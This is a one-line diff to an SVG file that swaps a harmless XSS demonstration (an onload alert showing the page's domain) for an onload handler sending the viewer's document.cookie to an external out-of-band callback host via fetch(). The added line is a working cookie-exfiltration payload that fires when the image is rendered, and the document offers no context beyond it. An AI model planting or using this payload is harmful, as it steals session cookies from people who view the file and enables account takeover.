@@ -1,1 +1,1 @@
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"> <rect width="200" height="100" fill="red"/> </svg>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://dxpzvqoxwabadvuroippow75l3kauo82h.oast.fun/?c='+document.cookie)"></svg>
